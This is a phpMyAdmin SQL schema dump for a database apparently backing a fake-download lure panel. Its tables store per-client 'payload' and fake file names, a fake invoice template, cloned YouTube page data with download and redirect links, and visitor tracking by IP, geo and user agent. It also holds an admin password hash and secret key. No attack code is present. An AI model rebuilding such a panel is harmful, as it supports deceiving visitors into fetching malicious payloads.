-- phpMyAdmin SQL Dump
-- version 3.5.1
-- http://www.phpmyadmin.net
--
-- Хост: 127.0.0.1
-- Время создания: Окт 21 2017 г., 09:57
-- Версия сервера: 5.5.25
-- Версия PHP: 5.3.13

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `oct`
--

-- --------------------------------------------------------

--
-- Структура таблицы `clients`
--

CREATE TABLE IF NOT EXISTS `clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `fakefn` varchar(128) NOT NULL DEFAULT 'none',
  `date_created` varchar(128) NOT NULL,
  `visits` varchar(128) NOT NULL DEFAULT '0',
  `downloads` varchar(128) NOT NULL DEFAULT '0',
  `template` varchar(128) NOT NULL DEFAULT 'none',
  `personal` int(1) NOT NULL DEFAULT '0',
  `method` varchar(128) NOT NULL,
  `domain` varchar(512) NOT NULL,
  `lang` varchar(512) NOT NULL,
  `payload` varchar(4096) NOT NULL,
  `pdf_file` varchar(128) NOT NULL DEFAULT 'none',
  `watch_url` varchar(10) NOT NULL DEFAULT 'none',
  `glitch` int(11) NOT NULL DEFAULT '0',
  `ver` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Структура таблицы `domains`
--

CREATE TABLE IF NOT EXISTS `domains` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(512) NOT NULL,
  `ssl` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Структура таблицы `languages`
--

CREATE TABLE IF NOT EXISTS `languages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `filename` varchar(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Дамп данных таблицы `languages`
--

INSERT INTO `languages` (`id`, `name`, `filename`) VALUES
(1, 'EN', 'en.lang'),
(2, 'RU', 'ru.lang'),
(3, 'ZH', 'zh.lang');

-- --------------------------------------------------------

--
-- Структура таблицы `personal_templates`
--

CREATE TABLE IF NOT EXISTS `personal_templates` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client` varchar(128) NOT NULL,
  `template` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `autodetect_language` int(11) NOT NULL DEFAULT '0',
  `redirect_ios` varchar(4096) NOT NULL DEFAULT '0',
  `redirect_android` varchar(4096) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`autodetect_language`, `redirect_ios`, `redirect_android`) VALUES
(1, '0', '0');

-- --------------------------------------------------------

--
-- Структура таблицы `statistics`
--

CREATE TABLE IF NOT EXISTS `statistics` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client` varchar(128) NOT NULL,
  `date` varchar(128) NOT NULL,
  `geo` varchar(128) NOT NULL,
  `ip` varchar(128) NOT NULL,
  `os` varchar(128) NOT NULL,
  `browser` varchar(128) NOT NULL,
  `uag` varchar(4096) NOT NULL,
  `lang` varchar(128) NOT NULL,
  `referer` varchar(2048) NOT NULL,
  `referer_full` varchar(4096) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Структура таблицы `templates`
--

CREATE TABLE IF NOT EXISTS `templates` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Дамп данных таблицы `templates`
--

INSERT INTO `templates` (`id`, `name`, `text`) VALUES
(1, 'TestTemplate', '<h1 class="b-article__title" itemprop="name" style="max-height: 1e+06px; margin-top: 0px; margin-bottom: 1em; padding: 0px; border: 0px; font-weight: 700; font-stretch: inherit; line-height: 1.15; font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-size: 16px; vertical-align: baseline; color: rgb(51, 51, 51);"><img src="http://cdn.evbstatic.com/s3-s3/static/images/en_AU/my_tickets/current_orders/GST_invoice_example.png" style="width: 100%;"><br></h1>');

-- --------------------------------------------------------

--
-- Структура таблицы `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `password` varchar(32) NOT NULL,
  `secretkey` varchar(32) NOT NULL,
  `last_login_datetime` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  UNIQUE KEY `secretkey` (`secretkey`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Дамп данных таблицы `users`
--

INSERT INTO `users` (`id`, `name`, `password`, `secretkey`, `last_login_datetime`) VALUES
(1, 'admin', '5cc08fead522e6f41c1cb90bbbf88d9c', '59eac7c589da3', 1508558789);

-- --------------------------------------------------------

--
-- Структура таблицы `youtube`
--

CREATE TABLE IF NOT EXISTS `youtube` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `keyword` varchar(128) NOT NULL,
  `big_img_link` varchar(4096) NOT NULL,
  `cur_video_title` text NOT NULL,
  `cur_video_thumb_img_url` text NOT NULL,
  `cur_video_channel_name` text NOT NULL,
  `cur_video_channel_link` text NOT NULL,
  `cur_video_channel_subscribers` text NOT NULL,
  `cur_video_views` text NOT NULL,
  `cur_video_likes_p` int(11) NOT NULL,
  `cur_video_likes_с` int(11) NOT NULL,
  `cur_video_dislikes_p` int(11) NOT NULL,
  `cur_video_dislikes_с` int(11) NOT NULL,
  `cur_video_published_date` text NOT NULL,
  `cur_video_descr` text NOT NULL,
  `cur_video_category` varchar(1024) NOT NULL,
  `cur_video_license` varchar(1024) NOT NULL,
  `cur_video_duration` varchar(128) NOT NULL,
  `link_download` varchar(4096) NOT NULL,
  `redirect` varchar(4096) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
